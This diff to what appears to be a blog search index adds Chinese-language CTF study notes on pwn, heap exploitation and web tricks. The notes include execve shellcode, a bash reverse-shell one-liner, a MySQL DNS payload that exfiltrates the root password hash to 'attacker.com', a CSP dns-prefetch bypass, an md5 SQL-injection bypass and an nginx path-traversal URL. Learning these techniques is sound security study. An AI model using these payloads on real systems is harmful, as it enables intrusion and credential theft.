@@ -3,10 +3,418 @@
   
     
     <entry>
+      <title><![CDATA[issue | SwitchyOmega的auto witch]]></title>
+      <url>/2018/03/08/issue-SwitchyOmega%E7%9A%84auto-witch/</url>
+      <content type="html"><![CDATA[<p>自己的ss挂了..借了别人的ss, 然后发现…怎么没办法用, 访问google一直转圈圈</p>
+<p>然后curl了一下发现是会跳到<code>www.google.com.hk</code>…然而auto switch里没有这条规则….工具栏上的<code>SwitchyOmega</code>里显示的也是<code>www.google.com</code>, 这样子就没法直接添加这条规则,,,得自己点进去设置, 手动添加这规则…</p>
+<pre><code>*.google.com.*
+</code></pre>]]></content>
+      
+        <categories>
+            
+            <category> issue </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[pwn | trick]]></title>
+      <url>/2018/01/20/pwn-trick/</url>
+      <content type="html"><![CDATA[<p>今天学pwn…希望能坚持…现在还没有什么trick, 就当一个备忘的板子</p>
+<h3 id="21字节shellcode"><a href="#21字节shellcode" class="headerlink" title="21字节shellcode"></a>21字节shellcode</h3><p>应该是x86通用的?</p>
+<pre class="line-numbers language-python"><code class="language-python">shellcode  <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x0b\xcd\x80"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-asm"><code class="language-asm">   0:   31 c9                   xor    ecx,ecx
+   2:   f7 e1                   mul    ecx
+   4:   51                      push   ecx
+   5:   68 2f 2f 73 68          push   0x68732f2f
+   a:   68 2f 62 69 6e          push   0x6e69622f
+   f:   89 e3                   mov    ebx,esp
+  11:   b0 0b                   mov    al,0xb
+  13:   cd 80                   int    0x80
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="利用leave伪造栈帧"><a href="#利用leave伪造栈帧" class="headerlink" title="利用leave伪造栈帧"></a>利用leave伪造栈帧</h3><pre class="line-numbers language-asm"><code class="language-asm">push ebp
+mov  ebp, esp
+
+leave # mov esp, ebp | pop ebp
+ret
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个leave可以改变esp的值, 所以只要伪造一个ebp, 然后跳到一个leave的片段就可以</p>
+<pre><code>旧的栈帧
+-----------------------------
+padding | fake ebp | ret_addr
+                        +
+                        +--&gt; leave | ret ----------------+
+                                +----&gt; esp = fake ebp    |
+            +---------------------------+  pop ebp       |
+            |                        +---------+         |
+            +                        |                   |
+伪造的栈帧 esp(原fake ebp)           |     | ret_addr &lt;--+
+-------------------------------------+-----+----------
+fake ebp2(上一句的leave的后半句要pop ebp)  | fake addr
+</code></pre><p>把这里的ret_addr设置为<code>leave; ret</code>的gadget的地址<br>当执行leave这一句的时候, 当前的esp就变为了我们设置的<code>fake ebp</code>, 这个时候下一句的ret就是从我们当前的esp处(我们前面的fake的ebp地址)弹出的地址作为返回地址了, 所以我们还要提前在<code>fake ebp</code>这里写好, 这里就需要我们能有一块知道地址并且可写的地址来放我们的<code>fake ebp</code>指向的区域</p>
+<p>应该是适用于那种栈溢出能利用的字节比较少的时候, 对…做了几道题, 发现…这原来叫栈迁移…就一般只能覆盖到ebp和ret的时候可以用这个技巧</p>
+<h3 id="libc-csu-init处的gadget"><a href="#libc-csu-init处的gadget" class="headerlink" title="libc_csu_init处的gadget"></a>libc_csu_init处的gadget</h3><p>可以控制大量的寄存器, 常用于64位rop…然后顺手牵一段代码</p>
+<h3 id="MK-FP"><a href="#MK-FP" class="headerlink" title="MK_FP"></a>MK_FP</h3><p>一般你看到的MK_FP是用来实现Canary的<br>ida里类似的代码</p>
+<pre class="line-numbers language-c"><code class="language-c">v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="堆方向大概是这样子的"><a href="#堆方向大概是这样子的" class="headerlink" title="堆方向大概是这样子的"></a>堆方向大概是这样子的</h3><pre><code>+--------------+ 高
++  top chunk   |
++--------------+
++ size of top  |
++--------------+
++ prev size    |
++--------------+
++--------------+
++ chunk0       |
++--------------+
++size of chunk0|
++--------------+
++ prev size    |
++ -------------+ 低
+</code></pre><h3 id="实际堆块大小"><a href="#实际堆块大小" class="headerlink" title="实际堆块大小"></a>实际堆块大小</h3><p>以32为例, <code>malloc(size)</code>, 这里是说至少能放得下size大小的data, 那么实际割下来一块<code>((size + 4 + 7) &amp; ~7)</code><br>先说这里的 <code>(size + 4)</code> 这一部分, 因为需要8bit的<code>meta</code>信息, 而又可以使用下一块的4bit的<code>prev_size</code>, 所以元信息只要额外的4bit</p>
+<pre><code>----------+-----
+prev_size | 4bit
+----------+-----
+size      | 4bit
+----------+-----
+chunk     | ?bit
+----------+-----
+人家的prev_size
+----------+-----
+</code></pre><p>再说这里的<code>((x + 7) &amp; ~7)</code>, 这个是为了8字节对齐, 明眼人一下就看出来这是个分段函数<br><code>x = 1...8</code>时候<code>f(x) = 8</code>, <code>x = 9...16</code>的时候<code>f(x) = 16</code>, 恩, 就这样子</p>
+<p>另外, 32位以8字节对齐, 那64位应该是16字节对齐的?所以就是<code>((size + 8 + 15) &amp; ~15)</code>, ???</p>
+<p>对的, 是双字对齐<code>double-word aligned</code></p>
+<h3 id="fast-bin-大小"><a href="#fast-bin-大小" class="headerlink" title="fast bin 大小"></a>fast bin 大小</h3><p>16~64(0x10, 0x40) bytes for x86_32<br>32~128(0x20, 0x80) bytes for x86_64<br>这个大小应该指的是data的大小, 还是总共分的大小</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> <span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> <span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对应fastbinY差不多…是这样子的</p>
+<pre><code>fastbinY[0] -&gt; &#39;p3&#39; -&gt; &#39;p2&#39; -&gt; &#39;p1&#39; -&gt; NULL
+</code></pre><p>等再分配的时候, 会把<code>p3</code>先unlink出去, 然后是<code>p2</code>, <code>p1</code><br>相当于是栈, LIFO, 但怎么感觉哪里怪怪的…这个栈顶在<code>fastbinY[?]</code></p>
+<p>而对于普通的bins, 是这样子</p>
+<pre><code>bins[0] -&gt; 0x604940 -&gt; 0x604820
+           后入后出    先入先出
+</code></pre><p>进入的方向和fastbins是一样的, 但出去的方向是不一样的</p>
+<h3 id="FIFO-amp-LIFO"><a href="#FIFO-amp-LIFO" class="headerlink" title="FIFO &amp; LIFO"></a>FIFO &amp; LIFO</h3><p>fastbins是先进后出, 像栈一样<br>其他的bins都是先进先出, 像队列一样</p>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>FULL RELRO之后就不能改写got表了</p>
+<h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><p>UAF 用来leak堆上的信息, 然后计算一些地址</p>
+<p>double free用来利用unlink漏洞(以前glibc的unlink没有检查, 只需要一次free就可以利用了) 看到某人写到double free的核心在于第二次free的时候发生的unlink, 虽然叫double free, 但其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞, 我觉得看了很多还是这一篇讲述的清楚 <a href="http://www.cnblogs.com/elvirangel/p/7203540.html" target="_blank" rel="external">http://www.cnblogs.com/elvirangel/p/7203540.html</a></p>
+<p>注意了…bins里的size字段存储的是<code>prev_size + size + data</code>的长度, 不是data的长度, 只有这样子才能通过size字段来找到下一块啊….</p>
+<h3 id="新的unlink的利用方法-传说中的unlink"><a href="#新的unlink的利用方法-传说中的unlink" class="headerlink" title="新的unlink的利用方法(传说中的unlink)"></a>新的unlink的利用方法(传说中的unlink)</h3><pre><code>|&lt;-------------------p1-------------------------&gt;|&lt;-----p2------&gt;
++-----------+------+-----------------------------+----------------+
+| prev_size | size |fake_prev|fake_size|fake_data|prev|size|data  |
++-----------+------+-----------------------------+----------------+
+                   |&lt;-----fake出来的堆块--------&gt;|&lt;-溢出时fake一下|
+</code></pre><p>通过p1的堆溢出来在p1的数据部分fake一个堆, 同时对p2的下一块的prev(改成fake出来堆块的大小)和size(主要是标志位)进行修改, 让系统以为p1已经空闲, 然后在<code>free(p2)</code>的时候就可以对p1进行unlink, 这个时候就要注意fake出来的堆块的构造方式, 主要是fake_fd和fake_bk….</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>double free的经典题目<code>0ctf2015-freenote</code>的wp很多, 但我感觉这一篇真棒, 有图真好, <a href="http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up" target="_blank" rel="external">http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up</a><br><a href="http://rk700.github.io/2015/04/21/0ctf-freenote/" target="_blank" rel="external">http://rk700.github.io/2015/04/21/0ctf-freenote/</a></p>
+<h3 id="总觉UAF和unlink哪里很像"><a href="#总觉UAF和unlink哪里很像" class="headerlink" title="总觉UAF和unlink哪里很像"></a>总觉UAF和unlink哪里很像</h3><h3 id="很多天了-没搞清楚这个unlink的double-free"><a href="#很多天了-没搞清楚这个unlink的double-free" class="headerlink" title="很多天了, 没搞清楚这个unlink的double free"></a>很多天了, 没搞清楚这个unlink的double free</h3><p>在unlink一个块, 我们叫他<code>p = 0x604800</code>的时候是(64位为例)<br>用方块代表取一个地址里的东西</p>
+<pre><code>BK = p -&gt; bk
+   BK = [0x604800 + 0x18] = 0x604900
+FD = p -&gt; fd
+   FD = [0x604800 + 0x10] = 0x604700
+然后
+BK -&gt; fd = FD -&gt; bk
+   [0x604700 + 0x18] = [0x604900 + 0x10] 
+   [0x604900 + 0x10] = [0x604700 + 0x18]
+</code></pre><p>我已经崩坏了….</p>
+<p>double link的时候, ptr是找到一个地址指向我们要unlink的块, 而不是 <code>ptr == p</code>. 是<code>*ptr == p</code>,(p是我们unlink的时候要释放的fake出来的块), 理解错误之一<br>unlink的时候这个会发生一次赋值<del><code>ptr = p - 0x18</code></del>, 这里是我理解的最大错误之二, 应该是<code>*ptr = ptr - 3</code><br>然后如果能对ptr里存的地址所指向的位置进行写的话, 就可以写到<code>ptr - 3</code>的地方<br>现在才懂这个图是啥意思 <a href="http://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6195919.html</a><br>然后对 <code>note[0] -&gt; content</code> (我们上面的ptr)进行写入的话, 其实就是写到了<code>ptr - 0xc</code>这个地址, 因为<code>ptr - 0x18</code>这个地址位于<code>ptr</code>的上方, 所以这样子就能重新覆盖掉ptr, 比如把ptr里的内容覆盖成<code>free@got</code>,<br>我怕是个傻子</p>
+<p>妈的, 终于懂了</p>
+<h3 id="贴一篇关于堆-感觉挺好的"><a href="#贴一篇关于堆-感觉挺好的" class="headerlink" title="贴一篇关于堆, 感觉挺好的"></a>贴一篇关于堆, 感觉挺好的</h3><p><a href="https://paper.seebug.org/255/" target="_blank" rel="external">https://paper.seebug.org/255/</a></p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>看这个 <a href="https://paper.seebug.org/246/" target="_blank" rel="external">https://paper.seebug.org/246/</a></p>
+<h3 id="有的时候不能想当然"><a href="#有的时候不能想当然" class="headerlink" title="有的时候不能想当然"></a>有的时候不能想当然</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我看到这个的时候一般认为, 局部变量a应该是先进行分配, 所以处于更高的位置, buffer位于低一些的位置, 更靠近func2的调用堆栈, 其实呢, 编译发现…gcc可能会对局部变量的位置进行调整, 就像这里, 我看到的是 buffer 更高, 所以不能YY, 要自己看编译后的结果…毕竟不知道编译的时候gcc对程序做了什么优化对齐啊什么什么的</p>
+<h3 id="这样子一段"><a href="#这样子一段" class="headerlink" title="这样子一段"></a>这样子一段</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>对这个setvbuf还是不太懂</p>
+<h3 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>test使用<code>AAAA.%1$p.%2$p...</code>这样子的</p>
+<h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>确定位置之后,比如是<code>%3$p</code>, 使用<code>addr.%3$s</code>来任意地址读…我这里写了个题, 利用格式化字符串来DynELF…结果失败了,QAQ, 不知道为啥</p>
+<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><h3 id="IDA相关"><a href="#IDA相关" class="headerlink" title="IDA相关"></a>IDA相关</h3><p>就写在这里吧…<br>IDA栈帧表示</p>
+<pre><code>-0000000000000008                 db ? ; undefined
+-0000000000000007                 db ? ; undefined
+-0000000000000006                 db ? ; undefined
+-0000000000000005                 db ? ; undefined
+-0000000000000004 var_4           dd ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+</code></pre><p>这个s是saved的ebp, r是返回地址ret</p>
+]]></content>
+      
+        <categories>
+            
+            <category> trick </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 学习 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[dns | trick积累]]></title>
+      <url>/2018/01/09/dns-trick%E7%A7%AF%E7%B4%AF/</url>
+      <content type="html"><![CDATA[<p>DNS学习: <a href="http://momomoxiaoxi.com/2016/12/02/DNSQUICDNSSSC/" target="_blank" rel="external">http://momomoxiaoxi.com/2016/12/02/DNSQUICDNSSSC/</a></p>
+<p>先上工具 ceye.io<br>今天看到dalao的wp利用到了这个…感觉真棒<br>因为一直没有VPS, QAQ, 看dalao每天dns外带数据什么的…<br>但…要绑手机号…QAQ…wtf</p>
+<p>一些常用的使用技巧 <a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
+<p>DNS利用一般用于盲注时候外带数据</p>
+<blockquote>
+<p>什么情况下, 只能用DNS外带数据, 不能用HTTP请求外带</p>
+<ol>
+<li>命令执行时候不能用curl, 只能ping ???</li>
+<li></li>
+</ol>
+</blockquote>
+<h3 id="DNS外带数据"><a href="#DNS外带数据" class="headerlink" title="DNS外带数据"></a>DNS外带数据</h3><p>mysql的payload</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> password <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.attacker.com\\foobar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其实我不太理解, 这里的<code>\\\\</code>是为了干啥, select一下<code>\\\\</code></p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select "\\\\";
++----+
+| \\ |
++----+
+| \\ |
++----+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其他的参考: <a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
+<p>有命令执行, sql注入, XXE, ….</p>
+<p>再贴一篇[sql注入中用DNS获取数据]: <a href="http://wooyun.jozxing.cc/static/drops/tips-5283.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-5283.html</a></p>
+<p>又找到一篇: <a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="external">https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/</a><br>上一篇的翻译版: <a href="http://www.mottoin.com/96463.html" target="_blank" rel="external">http://www.mottoin.com/96463.html</a></p>
+<h3 id="DNS-预加载绕过CSP"><a href="#DNS-预加载绕过CSP" class="headerlink" title="DNS 预加载绕过CSP"></a>DNS 预加载绕过CSP</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span>”dns-prefetch”</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>”hacker.com”</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>贴篇文章: <a href="https://www.anquanke.com/post/id/84803" target="_blank" rel="external">https://www.anquanke.com/post/id/84803</a></p>
+<h3 id="DNS-rebinding-来-SSRF"><a href="#DNS-rebinding-来-SSRF" class="headerlink" title="DNS rebinding 来 SSRF"></a>DNS rebinding 来 SSRF</h3><p>这个…还是得…买个vps, 搞个域名</p>
+<p>见33c3 list0r</p>
+<h3 id="DNS-txt执行powershell"><a href="#DNS-txt执行powershell" class="headerlink" title="DNS txt执行powershell"></a>DNS txt执行powershell</h3><p><a href="http://wooyun.jozxing.cc/static/drops/tips-8971.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-8971.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> trick </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> dns </tag>
+            
+            <tag> trick </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[python | Flask学习]]></title>
+      <url>/2018/01/07/python-Flask%E5%AD%A6%E4%B9%A0/</url>
+      <content type="html"><![CDATA[<p>这不是魔法<br><a href="http://python.jobbole.com/80956/" target="_blank" rel="external">http://python.jobbole.com/80956/</a><br><a href="http://python.jobbole.com/80993/" target="_blank" rel="external">http://python.jobbole.com/80993/</a><br>主要讲了装饰器, 适合没学过python的, 像我一样的新手</p>
+<p>来自Bendawang<br><a href="http://blog.csdn.net/qq_19876131/article/details/50830467" target="_blank" rel="external">http://blog.csdn.net/qq_19876131/article/details/50830467</a><br>后面这个结构我还是没懂 ==</p>
+<p>补上import资料<br><a href="http://python.jobbole.com/82604/" target="_blank" rel="external">http://python.jobbole.com/82604/</a><br><a href="https://www.cnblogs.com/Lands-ljk/p/5880483.html" target="_blank" rel="external">https://www.cnblogs.com/Lands-ljk/p/5880483.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[web | trick 积累]]></title>
+      <url>/2018/01/05/web-trick-%E7%A7%AF%E7%B4%AF/</url>
+      <content type="html"><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹到<code>127.0.0.1:6789</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">/bin/bash -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/6789 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Time-Based-RCE"><a href="#Time-Based-RCE" class="headerlink" title="Time Based RCE"></a>Time Based RCE</h3><p><a href="http://icematcha.win/?p=532" target="_blank" rel="external">http://icematcha.win/?p=532</a></p>
+<h3 id="python-python-sandbox-bypass"><a href="#python-python-sandbox-bypass" class="headerlink" title="python | python sandbox bypass"></a>python | python sandbox bypass</h3><p><a href="http://icematcha.win/?p=725" target="_blank" rel="external">http://icematcha.win/?p=725</a><br><a href="https://winter3un.github.io/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" target="_blank" rel="external">https://winter3un.github.io/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/</a></p>
+<h3 id="php-md5-pass-true"><a href="#php-md5-pass-true" class="headerlink" title="php | md5($pass, true)"></a>php | md5($pass, true)</h3><pre class="line-numbers language-sql"><code class="language-sql">$sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM admin WHERE pass = '"</span><span class="token punctuation">.</span>md5<span class="token punctuation">(</span>$password<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>md5()第二个参数为true(默认false)的时候, 相当于执行了一次py里的<code>str.decode(&#39;hex&#39;)</code><br>一个广为流传的答案<code>ffifdyop</code> =&gt; <code>276f722736c95d99e921722cf9ed621c</code> =&gt; <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code><br>就变成了<code>SELECT * FROM admin WHERE pass = &#39;&#39; or &#39;trash&#39;</code></p>
+<blockquote>
+<p>有一个坑点记录一下, 命令行里的echo默认是带换行的…所以<br>haibin@pc~$: echo ‘ffifdyop’ | md5sum 算出来的值不对…要去掉换行<br>haibin@pc~$: echo -n ‘ffifdyop’ | md5sum</p>
+</blockquote>
+<h3 id="node-Buffer-number-is-unsafe"><a href="#node-Buffer-number-is-unsafe" class="headerlink" title="node | Buffer(number) is unsafe"></a>node | Buffer(number) is unsafe</h3><p>node里Buffer(number)会泄露堆上的内存<br><a href="https://github.com/nodejs/node/issues/4660" target="_blank" rel="external">https://github.com/nodejs/node/issues/4660</a><br><a href="https://www.smrrd.de/nodejs-hacking-challenge-writeup.html" target="_blank" rel="external">https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</a></p>
+<h3 id="python-python-urllib-header注入"><a href="#python-python-urllib-header注入" class="headerlink" title="python | python urllib header注入"></a>python | python urllib header注入</h3><p>传说中的<code>CVE-2016-5699</code>: <a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a><br>在Redis上的利用: <a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/106</a></p>
+<h3 id="padding-orcale"><a href="#padding-orcale" class="headerlink" title="padding orcale"></a>padding orcale</h3><p>session ctf 2016 | biscuiti</p>
+<h3 id="cookie-amp-amp-同源策略"><a href="#cookie-amp-amp-同源策略" class="headerlink" title="cookie &amp;&amp; 同源策略"></a>cookie &amp;&amp; 同源策略</h3><p><a href="https://www.cnblogs.com/gg1234/p/5611086.html" target="_blank" rel="external">https://www.cnblogs.com/gg1234/p/5611086.html</a></p>
+<p>cookie这个domain为什么最前面有个点: <a href="http://www.ietf.org/rfc/rfc2109.txt" target="_blank" rel="external">http://www.ietf.org/rfc/rfc2109.txt</a><br>没有点不应该接受<br>实际javascript设置的时候好像如果不加点设置了, 自己查看都会看到前面有个点, 所以是浏览器迁就了我们吗QAQ</p>
+<p>应该是<code>xxx.abc.com</code> 设置cookie的时候</p>
+<ol>
+<li>能设置 <code>domain = &#39;.abc.com&#39;</code>, 然后遇到<code>yyy.abc.com</code>能读到这个cookie, <code>zzz.yyy.abc.com</code>就读不到了, 是不是这样子, QAQ</li>
+<li>也能设置 <code>domain = &#39;.xxx.abc.com&#39;</code>, 这个时候<code>yyy.abc.com</code>也不能访问得到, 但<code>mmm.xxx.abc.com</code>可以访问得到, 是不是这样子, QAQ</li>
+</ol>
+<p>另外cookie的同源策略不判断 端口 &amp;&amp; 协议</p>
+<h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><p><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">http://blog.csdn.net/syh_486_007/article/details/51228628</a></p>
+<h3 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h3><p>pwnhub | 忘了题叫啥<br>34c3-ctf | urlstorage</p>
+<h3 id="nginx配置不当导致任意文件读取"><a href="#nginx配置不当导致任意文件读取" class="headerlink" title="nginx配置不当导致任意文件读取"></a>nginx配置不当导致任意文件读取</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">/</span>static <span class="token punctuation">{</span>
+        <span class="token keyword">alias</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>static<span class="token operator">/</span><span class="token punctuation">;</span>
+        <span class="token keyword">autoindex</span> on<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问<code>http://ip/static../</code></p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="sqli里的反引号"><a href="#sqli里的反引号" class="headerlink" title="sqli里的反引号"></a>sqli里的反引号</h3><p>在可以用列名的时候, 使用效果可以作为注释…<br><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/" target="_blank" rel="external">http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/</a></p>
+<h3 id="补题计划"><a href="#补题计划" class="headerlink" title="补题计划"></a>补题计划</h3><p>~/plan-plan.md</p>
+]]></content>
+      
+        <categories>
+            
+            <category> trick </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[python | flask SSTI学习]]></title>
+      <url>/2018/01/05/python-flask-SSTI%E5%AD%A6%E4%B9%A0/</url>
+      <content type="html"><![CDATA[<p>上次AWD有一道模板注入…<br>我们利用的不好<br>而且等我们反应过来全场的…题目都挂了<br>检查了一下被写了<code>killall python</code>….真恐怖<br>由于前面有个nginx…挂了python很多人还没反应过来怎么了, 然后就没人修<br>然后我们没弹shell(不会弹), 就没法得分了</p>
+<p>开始看到freebuf的文章,,,<br><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/98619.html</a><br><a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/98928.html</a></p>
